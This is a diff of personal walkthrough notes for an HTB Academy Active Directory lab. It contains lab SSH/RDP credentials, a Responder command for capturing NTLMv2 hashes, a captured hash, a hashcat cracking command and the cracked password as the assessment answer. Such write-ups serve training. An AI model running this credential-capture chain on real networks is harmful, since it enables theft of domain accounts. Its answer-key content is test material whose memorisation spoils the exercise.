@@ -2,10 +2,46 @@
 
 SSH
 ```go
-sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.83.90
+sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.11.74
 ```
 
 xfreerdp
 ```go
-xfreerdp /v:10.129.45.234 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
+xfreerdp /v:10.129.11.74 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
+```
+
+#### Question 1: Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
+
+
+Log into the host. The user can sudo on everything. Use responder to grab a hash within the 172.16.6.0 subnet
+
+```go
+sudo responder -I ens224 -frw
+```
+
+Username and hash
+```go
+INLANEFREIGHT\AB920
+```
+
+```go
+AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+```
+
+#### Question 2: What is this user's cleartext password?
+
+Crack the hash
+```go
+hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt --force -O
+```
+
+Answer:
+```go
+weasal
+```
+
+#### Question 3: Submit the contents of the C:\flag.txt file on MS01.
+
+```go
+
 ```
